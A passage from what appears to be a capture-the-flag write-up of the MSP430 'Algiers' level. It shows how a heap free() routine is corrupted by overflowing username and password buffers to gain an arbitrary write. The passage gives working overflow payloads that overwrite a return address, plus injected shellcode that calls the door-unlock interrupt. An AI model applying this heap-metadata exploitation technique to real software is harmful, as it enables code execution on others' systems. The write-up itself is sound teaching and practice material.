│   │  <mark>2490</mark>  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │ │ │
│   └────────┴─────┬──┴────────┴──────────────────────────┘ │ │
│      ▲           │                                        │ │
│      │           │                                        │ │
└──────┼───────────┘                                        │ │
       │                                                    │ │
  ┌────┘        ┌───────────────────────────────────────────┘ │
  │             │                                             │
  │             │ ┌───────────────────────────────────────────┘
  │             │ │
  │             │ │         ┌──────────────────────┐
  │             ▼ ▼         │                      │
  │ ┌────────┬────────┬─────┴──┬────────┬────────┐ │
  │ │DATA    │  0000  │  2434  │  0026  │  ....  │ │
  │ ├────────┼────────┼────────┼────────┼────────┤ │
  │ │ADDRESS │ 0x2490 │ 0x2492 │ 0x2494 │  ....  │ │
  │ └────────┴────────┴────────┴────────┴────────┘ │
  │                                                │
  └────────────────────────────────────────────────┘
</code></pre>
  </section>
  <section id="diagram-free-modified-1-step-6">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa aaaa aaaa aaaa .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│      ┌───────────┘
│      │
│      │  ┌───────────────────────────────────────────────────┐
│      ▼  │                                                   │
│   ┌─────┴──┬────────┬────────┬──────────────────────────┐   │
│   │  2490  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │   │
│   └────────┴─────┬──┴────────┴──────────────────────────┘   │
│                  │                                          │
│                  │                                          │
│                  │                                          │
│      ┌───────────┘                                          │
│      │                                                      │
│      │ ┌──────────────────────────────────────────────────┐ │
│      ▼ │                                                  │ │
│   ┌────┴───┬────────┬────────┬──────────────────────────┐ │ │
│   │  2490  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │ │ │
│   └────────┴─────┬──┴────────┴──────────────────────────┘ │ │
│      ▲           │                                        │ │
│      │           │                                        │ │
└──────┼───────────┘                                        │ │
       │                                                    │ │
  ┌────┘        ┌───────────────────────────────────────────┘ │
  │             │                                             │
  │             │ ┌───────────────────────────────────────────┘
  │             │ │
  │             │ │         ┌──────────────────────┐
  │             ▼ ▼         │                      │
  │ ┌────────┬────────┬─────┴──┬────────┬────────┐ │
  │ │DATA    │  0000  │  2434  │  <mark>1fc8</mark>  │  ....  │ │
  │ ├────────┼────────┼────────┼────────┼────────┤ │
  │ │ADDRESS │ 0x2490 │ 0x2492 │ 0x2494 │  ....  │ │
  │ └────────┴────────┴────────┴────────┴────────┘ │
  │                                                │
  └────────────────────────────────────────────────┘
</code></pre>
  </section>
  <section id="diagram-free-modified-1-step-7">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │ ┌────────────────────────────────────────────────────┐
│ │  ▼ ▼ ▼ ▼                                                    │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐     │
│ └─┤  2408  │  241e  │  0021  │ aaaa aaaa aaaa aaaa .... │     │
│   └────────┴─────┬──┴────────┴──────────────────────────┘     │
│                  │                                            │
│      ┌───────────┘                                            │
│      │                                                        │
│      │  ┌───────────────────────────────────────────────────┐ │
│      ▼  │                                                   │ │
│   ┌─────┴──┬────────┬────────┬──────────────────────────┐   │ │
│   │  2490  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │   │ │
│   └────────┴─────┬──┴────────┴──────────────────────────┘   │ │
│                  │                                          │ │
│                  │                                          │ │
│                  │                                          │ │
│      ┌───────────┘                                          │ │
│      │                                                      │ │
│      │ ┌──────────────────────────────────────────────────┐ │ │
│      ▼ │                                                  │ │ │
│   ┌────┴───┬────────┬────────┬──────────────────────────┐ │ │ │
│   │  2490  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │ │ │ │
│   └────────┴─────┬──┴────────┴──────────────────────────┘ │ │ │
│                  │                                        │ │ │
│                  │                                        │ │ │
└──────────────────┘                                        │ │ │
                                                            │ │ │
                ┌───────────────────────────────────────────┘ │ │
                │                                             │ │
                │ ┌───────────────────────────────────────────┘ │
                │ │                                             │
                │ │         ┌───────────────────────────────────┘
                ▼ ▼         │
    ┌────────┬────────┬─────┴──┬────────┬────────┐
    │DATA    │  0000  │  <mark>2408</mark>  │  1fc8  │  ....  │
    ├────────┼────────┼────────┼────────┼────────┤
    │ADDRESS │ 0x2490 │ 0x2492 │ 0x2494 │  ....  │
    └────────┴────────┴────────┴────────┴────────┘


</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#diagram-free-modified-1-step-1">01</a></li>
  <li><a href="#diagram-free-modified-1-step-2">02</a></li>
  <li><a href="#diagram-free-modified-1-step-3">03</a></li>
  <li><a href="#diagram-free-modified-1-step-4">04</a></li>
  <li><a href="#diagram-free-modified-1-step-5">05</a></li>
  <li><a href="#diagram-free-modified-1-step-6">06</a></li>
  <li><a href="#diagram-free-modified-1-step-7">07</a></li>
</ul>

<p>This behavior implies that it is possible to overwrite arbitrary addresses with the two values at <code>0x2492</code> and <code>0x2494</code>—a random write primitive. While this may sometimes be useful, controlling the two written values would be preferable. The next question is where they come from.</p>


<p>This example writes the value <code>0x2408</code> to address <code>0x2492</code>. The value <code>0x2408</code> is recognizable in multiple other locations before the <code>free</code> call.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  <mark>2408</mark>  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>2408</mark>  │  241e  │  0021  │ aaaa aaaa aaaa aaaa .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│      ┌───────────┘
│      │
│      │  ┌───────────────────────────────────────────────────┐
│      ▼  │                                                   │
│   ┌─────┴──┬────────┬────────┬──────────────────────────┐   │
│   │  2490  │  2434  │  0021  │ bbbb 0000 0000 0000 .... │   │
│   └────────┴─────┬──┴────────┴──────────────────────────┘   │
│      ▲           │                                          │
│ ┌────┘           │                                          │
│ │                │                                          │
│ │    ┌───────────┘                                          │
│ │    │                                                      │
│ │    │                                                      │
│ │    ▼                                                      │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐   │
│ └─┤  241e  │  <mark>2408</mark>  │  1f9c  │ 0000 0000 0000 0000 .... │   │
│   └────────┴─────┬──┴────────┴──────────────────────────┘   │
│                  │                                          │
│                  │                                          │
└──────────────────┘                                          │
                                                              │
                                                              │
                                                              │
                  ┌───────────────────────────────────────────┘
                  │
                  │
                  ▼
    ┌────────┬────────┬────────┬────────┬────────┐
    │DATA    │  0000  │  0000  │  0000  │  ....  │
    ├────────┼────────┼────────┼────────┼────────┤
    │ADDRESS │ 0x2490 │ 0x2492 │ 0x2494 │  ....  │
    └────────┴────────┴────────┴────────┴────────┘
</code></pre>

<p>Assuming for the sake of argument that this data structure is entirely self-contained (i.e., there is no lookup table located elsewhere in memory), that implies that the contents of <code>0x2492</code> must come from one of these locations. Altering one of these words may allow direct control of the value written at <code>0x2492</code>.</p>

<p>The longest possible buffer overflow alters the latter of these words.</p>


<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa aaaa aaaa aaaa .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│      ┌───────────┘
│      │
│      │  ┌───────────────────────────────────────────────────┐
│      ▼  │                                                   │
│   ┌─────┴──┬────────┬────────┬──────────────────────────┐   │
│   │  2490  │  2434  │  0021  │ bbbb 0000 0000 0000 .... │   │
│   └────────┴─────┬──┴────────┴──────────────────────────┘   │
│      ▲           │                                          │
│ ┌────┘           │                                          │
│ │                │                                          │
│ │    ┌───────────┘                                          │
│ │    │                                                      │
│ │    │                                                      │
│ │    ▼                                                      │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐   │
│ └─┤  241e  │  <mark>2408</mark>  │  1f9c  │ 0000 0000 0000 0000 .... │   │
│   └────────┴─────┬──┴────────┴──────────────────────────┘   │
│                  │                                          │
│                  │                                          │
└──────────────────┘                                          │
                                                              │
                                                              │
                                                              │
                  ┌───────────────────────────────────────────┘
                  │
                  │
                  ▼
    ┌────────┬────────┬────────┬────────┬────────┐
    │DATA    │  0000  │  0000  │  0000  │  ....  │
    ├────────┼────────┼────────┼────────┼────────┤
    │ADDRESS │ 0x2490 │ 0x2492 │ 0x2494 │  ....  │
    └────────┴────────┴────────┴────────┴────────┘
</code></pre>

<p>The payload to achieve this is as follows. This overflow preserves the original memory contents except for the highlighted bytes.</p>

<h5>Username</h5>
<pre><code>aaaa aaaa aaaa aaaa aaaa aaaa aaaa aaaa <mark>90</mark>24 3424 2100</code></pre>

<h5>Password</h5>
<pre><code>bbbb bbbb bbbb bbbb bbbb bbbb bbbb bbbb 1e24 <mark>adde</mark> 9c1f</code></pre>

<h5>Result</h5>

<div id="slides">
  <section id="controlled-write-1-free-1-step-1">
<pre><code class='language-ascii-noshadows'>  ┌────────┬────────┬────────┬──────┐
  │  2408  │  1000  │  0000  │ 0000 │
  └────┬───┴────────┴────────┴──────┘
       │
       │
       │
┌──┐   │
│  ▼   ▼
│ ┌────────┬────────┬────────┬──────────────────────────┐
└─┤  2408  │  241e  │  0021  │ aaaa aaaa aaaa aaaa .... │
  └────────┴─────┬──┴────────┴──────────────────────────┘
                 │
     ┌───────────┘
     │
     │  ┌───────────────────────────────────────────────────┐
     ▼  │                                                   │
  ┌─────┴──┬────────┬────────┬──────────────────────────┐   │
  │  <mark>2490</mark>  │  2434  │  0021  │ bbbb bbbb bbbb bbbb .... │   │
  └────────┴─────┬──┴────────┴──────────────────────────┘   │
     ▲           │                                          │
┌────┘           │                                          │
│                │                                          │
│    ┌───────────┘                                          │
│    │                                                      │
│    │                                                      │
│    ▼                                                      │
│ ┌────────┬────────┬────────┬──────────────────────────┐   │
└─┤  241e  │  <mark>dead</mark>  │  1f9c  │ 0000 0000 0000 0000 .... │   │
  └────────┴────────┴────────┴──────────────────────────┘   │
                                                            │
                                                            │
                                                            │
                                                            │
                                                            │
                                                            │
                ┌───────────────────────────────────────────┘
                │
                │
                ▼
  ┌────────┬────────┬────────┬────────┬────────┐
  │DATA    │  0000  │  0000  │  0000  │  ....  │
  ├────────┼────────┼────────┼────────┼────────┤
  │ADDRESS │ 0x2490 │ 0x2492 │ 0x2494 │  ....  │
  └────────┴────────┴────────┴────────┴────────┘
</code></pre>
  </section>
  <section id="controlled-write-1-free-1-step-2">
<pre><code class='language-ascii-noshadows'>  ┌────────┬────────┬────────┬──────┐
  │  2408  │  1000  │  0000  │ 0000 │
  └────┬───┴────────┴────────┴──────┘
       │
       │
       │
┌──┐   │
│  ▼   ▼
│ ┌────────┬────────┬────────┬──────────────────────────┐
└─┤  2408  │  241e  │  0021  │ aaaa aaaa aaaa aaaa .... │
  └────────┴─────┬──┴────────┴──────────────────────────┘
                 │
     ┌───────────┘
     │
     │  ┌───────────────────────────────────────────────────┐
     ▼  │                                                   │
  ┌─────┴──┬────────┬────────┬──────────────────────────┐   │
  │  2490  │  2434  │  0020  │ bbbb bbbb bbbb bbbb .... │   │
  └────────┴─────┬──┴────────┴──────────────────────────┘   │
                 │                                          │
                 │                                          │
                 │                                          │
     ┌───────────┘                                          │
     │                                                      │
     │ ┌──────────────────────────────────────────────────┐ │
     ▼ │                                                  │ │
  ┌────┴───┬────────┬────────┬──────────────────────────┐ │ │
  │  2490  │  dead  │  1f9c  │ 0000 0000 0000 0000 .... │ │ │
  └────────┴────────┴────────┴──────────────────────────┘ │ │
                                                          │ │
                                                          │ │
                                                          │ │
                                                          │ │
              ┌───────────────────────────────────────────┘ │
              │                                             │
              │ ┌───────────────────────────────────────────┘
              │ │
              │ │
              ▼ ▼
  ┌────────┬────────┬────────┬────────┬────────┐
  │DATA    │  0000  │  <mark>dead</mark>  │  1fc8  │  ....  │
  ├────────┼────────┼────────┼────────┼────────┤
  │ADDRESS │ 0x2490 │ 0x2492 │ 0x2494 │  ....  │
  └────────┴────────┴────────┴────────┴────────┘
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#controlled-write-1-free-1-step-1">Before Free</a></li>
  <li><a href="#controlled-write-1-free-1-step-2">After Free</a></li>
</ul>

<pre><code>2490: 0000 <mark>adde</mark> c81f 0000 0000 0000 0000 0000   ................
24a0: 0000 0000 0000 0000 0000 0000 0000 0000   ................</code></pre>

<p>This alteration writes the big-endian value <code>0xdead</code> to address <code>0x2492</code>. Theoretically, this is an arbitrary write primitive that can clobber code pointers in one shot.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-1" class="sidenote-toggle" />
<span class="sidenote">
	Rather like Bedouins lying on beaches.
</span>
</p>

<h3>Exploit Weaponization</h3>
<p>Changing the exploit to overwrite a return address is simple. Single-step until the end of the <code>free</code> function (address <code>0x4562</code>).</p>

<br>
      <figure>
        <img src="./images/algiers/algiers-free-return-instruction.png"
          loading="eager" alt="Return instruction in free call." />
      </figure>

<p>The stack pointer at this point in execution is as follows.</p>

<br>
      <figure>
        <img src="./images/algiers/algiers-free-return-address.png"
          loading="eager" alt="Return address for first free call." />
      </figure>

      <p>The return address is the big-endian value <code>0x46a8</code>. The proof of concept will overwrite this value. The first overflowed word should be two bytes less than the address of the write target.</p>

<pre><code class='language-ascii-noshadows'>  ┌────────┬────────┬────────┬──────────────────────────┐
┌─┤  <mark>4392</mark>  │  ....  │  ....  │ .... .... .... .... .... │
│ └────────┴─────┬──┴────────┴──────────────────────────┘
│                │
│                │
│                │
│    ┌───────────┘
│    │
│    │
│    ▼
│ ┌────────┬────────┬────────┬──────────────────────────┐
│ │  ....  │  dead  │  ....  │ .... .... .... .... .... │
│ └────────┴─────┬──┴────────┴──────────────────────────┘
│                │WRITE
│                └─────┐
│                      │
│                      │
│                      │
│                      │
└─────────────┐        │
              │        │
              │        │
       POINTER▼        ▼
  ┌────────┬────────┬────────┬────────┐
  │DATA    │  ....  │  46a8  │  ....  │
  ├────────┼────────┼────────┼────────┤
  │ADDRESS │ 0x4392 │ <mark>0x4394</mark> │  ....  │
  └────────┴────────┴────────┴────────┘
</code></pre>

<h5>Username</h5>
<pre><code>aaaa aaaa aaaa aaaa aaaa aaaa aaaa aaaa <mark>9243</mark> 3424 2100</code></pre>

<p>The value that will overwrite the return address should be a pointer to some code. The address of the <code>unlock_door</code> function works, but it could also point to some shellcode injected as part of the username.</p>

<pre><code class='language-ascii-noshadows'>  ┌────────┬────────┬────────┬──────────────────────────┐
┌─┤  4392  │  ....  │  ....  │ .... .... .... .... .... │
│ └────────┴─────┬──┴────────┴──────────────────────────┘
│                │
│                │
│                │
│    ┌───────────┘
│    │
│    │
│    ▼
│ ┌────────┬────────┬────────┬──────────────────────────┐
│ │  ....  │  <mark>4564</mark>  │  ....  │ .... .... .... .... .... │
│ └────────┴─────┬──┴────────┴──────────────────────────┘
│                │WRITE
│                └─────┐
│                      │
│                      │
│                      │
│                      │
└─────────────┐        │
              │        │
              │        │
       POINTER▼        ▼
  ┌────────┬────────┬────────┬────────┐
  │DATA    │  ....  │  46a8  │  ....  │
  ├────────┼────────┼────────┼────────┤
  │ADDRESS │ 0x4392 │ 0x4394 │  ....  │
  └────────┴────────┴────────┴────────┘
</code></pre>

<h5>Password</h5>
<pre><code>bbbb bbbb bbbb bbbb bbbb bbbb bbbb bbbb 1e24 <mark>6445</mark> 9c1f</code></pre>

<h2>Arbitrary Code Execution</h2>
<p>Supplying the above data in the username and password buffers results in a successful unlock interrupt call.</p>
<br>
      <figure>
        <img src="./images/algiers/algiers-unlock.png"
          loading="eager" alt="Unlock status message." />
      </figure>

      <h4>Alternate Approach</h4>

      <p>Calling shellcode achieves the same result. Recall that executing the following assembly is functionally equivalent to calling the <code>unlock_door</code> function.</p>

      <h5>Disassembly</h5>
      <pre><code>3240 00ff      mov	#0xff00, sr
b012 1000      call	#0x10
</code></pre>

<h5>Assembly</h5>

<pre><code>324000ffb0121000</code></pre>

<p>Injecting the shellcode and modifying the exploit to call it is trivial. The data structure will be as follows after the return from <code>free</code>.</p>

<pre><code class='language-ascii-noshadows'>  ┌────────┬────────┬────────┬──────────────────────────┐
┌─┤  4392  │  ....  │  ....  │ 3240 00ff b012 1000 .... │
│ └────────┴─────┬──┴────────┴──────────────────────────┘
│                │             ▲POINTER
│                │             │
│                │             │
│    ┌───────────┘             │
│    │                         │
│    │                         └──────────────────────────┐
│    ▼                                                    │
│ ┌────────┬────────┬────────┬──────────────────────────┐ │
│ │  ....  │  240e  │  ....  │ .... .... .... .... .... │ │
│ └────────┴─────┬──┴────────┴──────────────────────────┘ │
│                │WRITE                                   │
│                └─────┐  ┌───────────────────────────────┘
│                      │  │
│                      │  │
│                      │  │
│                      │  │
└─────────────┐        │  │
              │        │  │
              │        │  │
       POINTER▼        ▼  │
  ┌────────┬────────┬─────┴──┬────────┐
  │DATA    │  ....  │  240e  │  ....  │
  ├────────┼────────┼────────┼────────┤
  │ADDRESS │ 0x4392 │ 0x4394 │  ....  │
  └────────┴────────┴────────┴────────┘
</code></pre>

<h5>Username</h5>
<pre><code><mark>3240 00ff b012 1000</mark> aaaa aaaa aaaa aaaa 9243 3424 2100</code></pre>

<h5>Password</h5>
<pre><code>bbbb bbbb bbbb bbbb bbbb bbbb bbbb bbbb 1e24 <mark>0e24</mark> 9c1f</code></pre>

<h5>Result</h5>
<pre><code>If you were not connected to the debug lock, the door would now be open.
Try running "solve" in the debug console to see if this solution works without the debugger attached.

The CPU completed in 7266 cycles.
</code></pre>

<h2>Refining The Technique</h2>

<p>This exploit requires either two separate buffer overflows or one very large one. In this case, there were 48 bytes of overflow, but that is not always true. For example, a more plausible scenario is where a developer allocates 16 bytes and then reads 0x16 bytes (decimal 22) into that buffer. Supposing there was only a single six-byte overflow, this technique would not work. Ideally, it should be possible to use this same write primitive given control of only the following three words.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>2408</mark>  │  <mark>2434</mark>  │  <mark>0021</mark>  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>


<h3>Substituting Arbitrary Values</h3>
<p>Refining the technique requires understanding the algorithm in more detail. Consider what happens after setting the first and second overflowed words to arbitrary values.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa aaaa aaaa aaaa .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│      ┌───────────┘
│      │
│      │
│      ▼
│   ┌────────┬────────┬────────┬──────────────────────────┐
│   │  <mark>cccc</mark>  │  <mark>eeee</mark>  │  0021  │ bbbb 0000 0000 0000 .... │
│   └─────┬──┴─────┬──┴────────┴──────────────────────────┘
│      ▲  │        │
│ ┌────┘  │        │
│ │       │        └─────────────────────────────────────────────┐
│ │       │                                                      │
│ │       └───────────────────────────────────────────────────┐  │
│ │                                                           │  │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐   │  │
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │   │  │
│   └────────┴─────┬──┴────────┴──────────────────────────┘   │  │
│                  │                                          │  │
└──────────────────┘                                          │  │
                                                              │  │
                  ┌───────────────────────────────────────────┘  │
                  │                                              │
                  │                                              │
                  │                                              │
                  │                                              │
                  ▼                                              │
    ┌────────┬────────┬────────┬────────┬────────┐               │
    │DATA    │  0000  │  0000  │  0000  │  ....  │               │
    ├────────┼────────┼────────┼────────┼────────┤               │
    │ADDRESS │ 0xcccc │ 0xccce │ 0xccd0 │  ....  │               │
    └────────┴────────┴────────┴────────┴────────┘               │
                                                                 │
                  ┌──────────────────────────────────────────────┘
                  ▼
    ┌────────┬────────┬────────┬────────┬────────┐
    │DATA    │  0000  │  0000  │  0000  │  ....  │
    ├────────┼────────┼────────┼────────┼────────┤
    │ADDRESS │ 0xeeee │ 0xeef0 │ 0xeef2 │  ....  │
    └────────┴────────┴────────┴────────┴────────┘
</code></pre>

<h5>Username</h5>
<pre><code>aaaa aaaa aaaa aaaa aaaa aaaa aaaa aaaa <mark>cccc</mark> <mark>eeee</mark> 2100</code></pre>

<h5>Password</h5>
<pre>bbbb</pre>

<h5>Results</h5>

<div id="slides">
  <section id="two-word-payload-memory-before-free-1">
<pre><code>2400: 0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
2410: aaaa aaaa aaaa aaaa aaaa aaaa aaaa cccc   ................
2420: eeee 2100 bbbb 0000 0000 0000 0000 0000   ..!.............
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
2440: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>
  </section>
  <section id="two-word-payload-memory-after-free-1">
<pre><code>2400: 0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
2410: aaaa aaaa aaaa aaaa aaaa aaaa aaaa cccc   ................
2420: eeee <mark>2000</mark> bbbb 0000 0000 0000 0000 0000   .. .............
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
2440: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#two-word-payload-memory-before-free-1">Payload Memory Before Free</a></li>
  <li><a href="#two-word-payload-memory-after-free-1">Payload Memory After Free</a></li>
</ul>

<div id="slides">
  <section id="target-memory-before-free-1">
<pre><code>ccd0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
cce0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
ccf0: *  
eee0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
eef0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>
  </section>
  <section id="target-memory-after-free-1">
<pre><code>ccd0: <mark>2c00</mark> 0000 0000 0000 0000 0000 0000 0000   ,...............
cce0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
ccf0: *  
eee0: 0000 0000 0000 0000 0000 0000 0000 <mark>cccc</mark>   ................
eef0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#target-memory-before-free-1">Target Memory Before Free</a></li>
  <li><a href="#target-memory-after-free-1">Target Memory After Free</a></li>
</ul>

<p>The algorithm now writes the value <code>0xCCCC</code> to address <code>0xEEEE</code>, suggesting the existence of another arbitrary write primitive. The payload probably has the following structure.</p>

<pre><code class='language-ascii-noshadows'>aaaa aaaa aaaa aaaa aaaa aaaa aaaa aaaa <mark>cccc</mark> <u>eeee</u> 2100
                                        ▲    ▲
                          ┌─────────────┘    └───┐
                          │                      │
                       ┌──┴──┐               ┌───┴───┐
		       │<mark>VALUE</mark>│ IS WRITTEN TO │<u>ADDRESS</u>│
                       └─────┘               └───────┘
</code></pre>

<h4>Load Address Unaligned Crash</h4>
<p>The next step is checking whether changing the write value tangibly affects the exploit.</p>

<pre><code>aaaa aaaa aaaa aaaa aaaa aaaa aaaa aaaa <mark>5555</mark> eeee 2100</code></pre>

<p>This payload results in a crash.</p>

<pre><code>load address unaligned: 5559
CPUOFF flag set; program no longer running. CPU must now be reset.
</code></pre>

<p>Recall that this value is also a pointer. Pointers must be word-aligned on the MSP430 ISA, meaning the written value must point to an even offset. Incrementing the first overflowed word fixes this bug.</p>

<pre><code>aaaa aaaa aaaa aaaa aaaa aaaa aaaa aaaa <mark>5655</mark> eeee 2100</code></pre>

<p>This results in the following behavior.</p>
<br>

<div id="slides">
  <section id="two-word-payload-memory-before-free-2">
<pre><code>2400: 0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
2410: aaaa aaaa aaaa aaaa aaaa aaaa aaaa 5655   ..............VU
2420: eeee 2100 bbbb 0000 0000 0000 0000 0000   ..!.............
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
2440: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>
  </section>
  <section id="two-word-payload-memory-after-free-2">
<pre><code>2400: 0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
2410: aaaa aaaa aaaa aaaa aaaa aaaa aaaa 5655   ..............VU
2420: eeee <mark>2000</mark> bbbb 0000 0000 0000 0000 0000   .. .............
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
2440: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#two-word-payload-memory-before-free-2">Payload Memory Before Free</a></li>
  <li><a href="#two-word-payload-memory-after-free-2">Payload Memory After Free</a></li>
</ul>

<div id="slides">
  <section id="target-memory-before-free-2">
<pre><code>5550: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5560: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5570: *  
eee0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
eef0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>
  </section>
  <section id="target-memory-after-free-2">
<pre><code>5550: 0000 0000 0000 0000 0000 <mark>2c00</mark> 0000 0000   ..........,.....
5560: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5570: *  
eee0: 0000 0000 0000 0000 0000 0000 0000 <mark>5655</mark>   ..............VU
eef0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#target-memory-before-free-2">Target Memory Before Free</a></li>
  <li><a href="#target-memory-after-free-2">Target Memory After Free</a></li>
</ul>

<p>Changing the value to write does not seem to alter the algorithm's behavior, the evenness requirement aside.</p>

<h3>Testing The Improved Technique</h3>

<p>This new technique works as follows. The proof of concept again targets the return address.</p>

<h5>Username</h5>
<pre><code>aaaa aaaa aaaa aaaa aaaa aaaa aaaa aaaa 6445 <mark>9443</mark> 2100</pre></code>

<p>This exploit will write the address of the <code>unlock_door</code> function over the return address for the current <code>free</code> call.</p>

<pre><code class='language-ascii-noshadows'>  ┌────────┬────────┬────────┬──────────────────────────┐
┌─┤  4564  │  4394  │  ....  │ .... .... .... .... .... │
│ └────────┴─────┬──┴────────┴──────────────────────────┘
│                │POINTER
│                └───────┐
│                        │
│                        │
│                        │
│                        │
└──────────────────────┐ │
                       │ │
                       │ │
                  WRITE▼ ▼
  ┌────────┬────────┬────────┬────────┐
  │DATA    │  ....  │  46a8  │  ....  │
  ├────────┼────────┼────────┼────────┤
  │ADDRESS │ 0x4392 │ 0x4394 │  ....  │
  └────────┴────────┴────────┴────────┘
</code></pre>

<h4>Instruction Address Unaligned Crash</h4>

<p>Submitting this payload results in another crash.</p>

<pre><code>insn address unaligned
CPUOFF flag set; program no longer running. CPU must now be reset.
</code></pre>

<p>Inspecting the register state reveals that <code>PC</code> contains the value <code>0x0001</code>.</p>

<h4>Debugging</h4>

<p>This behavior suggests that execution flow is affected by the exploit, although not in the way intended. The provided debugger does not have a backtrace command, so determining where the crash occurred is slightly more involved. Because the target return address is the one for the current <code>free</code> call, execution should redirect after the <code>RET</code> instruction at address <code>0x4562</code>.</p>

<pre><code>454a:  1d5f 0400      add	0x4(r15), r13
454e:  3d50 0600      add	#0x6, r13
4552:  8f4d 0400      mov	r13, 0x4(r15)
4556:  9f4e 0200 0200 mov	0x2(r14), 0x2(r15)
455c:  8e4f 0000      mov	r15, 0x0(r14)
4560:  3b41           pop	r11
<mark>4562:  3041           ret</mark>
</code></pre>

<p>Begin by supplying the same username and enter a short dummy value for the password. Insert a breakpoint at address <code>0x4562</code> and continue execution until that breakpoint.</p>

<br>
      <figure>
        <img src="./images/algiers/algiers-free-return-instruction.png"
          loading="eager" alt="Breakpoint at return instruction in free call." />
      </figure>

      <p>Stepping once reveals that execution successfully returns to the unlock_door function, but the exploit has corrupted the first two instructions in it.</p>

<br>
      <figure>
        <img src="./images/algiers/algiers-unlock-door-overwritten.png"
          loading="eager" alt="Return instruction in free call." />
      </figure>

      <p>The random data that overwrote the original instructions disassembles to the following.</p>
<br>
<table>
	<caption>Random Instructions</caption>
        <thead>
          <tr>
            <th>Opcode</th>
